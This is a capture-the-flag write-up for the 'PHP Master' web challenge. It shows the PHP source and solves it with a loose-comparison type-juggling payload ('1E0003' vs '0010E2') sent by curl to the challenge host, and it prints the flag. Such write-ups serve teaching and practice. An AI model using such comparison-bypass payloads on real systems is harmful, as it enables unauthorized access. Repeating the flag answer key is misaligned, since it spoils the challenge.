![](./../../../assets/images/banner_xmas.png)



    	
            
# PHP Master



## Challenge Author(s):
`yakuhito`

## Description:
```
Another one of *those* challenges.
```

## Target:

`http://challs.xmas.htsp.ro:3000/`

## Objective:

Forge a payload capable of bypassing the various constraints and checks in code, in order to have the flag printed.

## Difficulty/Points: 
`easy/33`

## Flag:
`X-MAS{s0_php_m4ny_skillz-69acb43810ed4c42}`
# 


# Challenge
Connecting to the Web Application, the webpage returned is:
```php

<?php

include('flag.php');

$p1 = $_GET['param1'];
$p2 = $_GET['param2'];

if(!isset($p1) || !isset($p2)) {
    highlight_file(__FILE__);
    die();
}

if(strpos($p1, 'e') === false && strpos($p2, 'e') === false  && strlen($p1) === strlen($p2) && $p1 !== $p2 && $p1[0] != '0' && $p1 == $p2) {
    die($flag);
}

?>

```
This *PHP page* extracts two parameters from the *GET request*, `param1 ($ p1)` and `param2 ($ p2)` and performs the following *checks* on them:
1. Check that the *'e'* character is not present in both *$p1* and *$p2*. 
2. Check that *$p1* and *$p2* have the same length (in number of characters).
3. Verify that *$p1* and *$p2* are different, using `PHP strict negated comparison  (! ==)`.
4. Check that the first character of *$p1* is different from the character *'0'*.
5. Check that *$p1* and *$p2* are equal, using `PHP loose comparison (==)`.

# Solution
The two parameters that respect all the previously mentioned constraints are:
`param1: 1E0003`
`param2: 0010E2`
```console
matt@grol:~$ curl -X GET "http://challs.xmas.htsp.ro:3000/index.php?param1=1E0003&param2=0010E2"
X-MAS{s0_php_m4ny_skillz-69acb43810ed4c42}
```

